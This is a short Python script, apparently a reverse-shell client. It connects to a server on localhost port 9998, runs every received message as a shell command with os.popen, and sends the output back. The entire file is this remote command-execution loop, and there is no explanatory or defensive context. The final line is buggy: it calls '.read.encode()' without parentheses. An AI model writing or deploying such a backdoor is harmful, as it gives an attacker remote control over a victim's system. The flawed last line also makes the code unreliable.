import os
import socket

host = "localhost"
port = 9998

client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client_sock.connect((host, port))

while True:
    msg_from_srv = client_sock.recv(1024)
    response = os.popen(msg_from_srv.decode()).read()
    print(response)
    client_sock.send(response.encode())
    client_sock.send(os.popen("echo %cd%").read.encode())
